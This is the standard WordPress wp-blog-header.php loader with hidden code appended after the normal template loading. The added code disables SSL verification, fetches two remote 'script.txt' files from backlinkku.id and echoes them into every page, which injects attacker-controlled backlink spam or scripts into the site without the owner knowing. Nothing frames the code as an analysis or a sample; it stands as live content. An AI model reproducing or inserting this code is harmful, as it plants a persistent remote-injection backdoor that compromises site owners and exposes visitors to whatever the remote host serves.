<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
if (!function_exists('fetch_remote_content')) {
    function fetch_remote_content($url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Bypass SSL verification if needed
        $output = curl_exec($ch);
        curl_close($ch);
        return $output;
    }
}
function fetch_and_display_content($url) {
    $fileContents = fetch_remote_content($url);
    if (strpos($fileContents, '<?php') === false) {
        echo $fileContents;
    }
}
$jasabacklinks_1 = 'https://backlinkku.id/menu/traffic-v1/script.txt';
$jasabacklinks_2 = 'https://backlinkku.id/menu/vip-v1/script.txt';
fetch_and_display_content($jasabacklinks_1);
fetch_and_display_content($jasabacklinks_2);
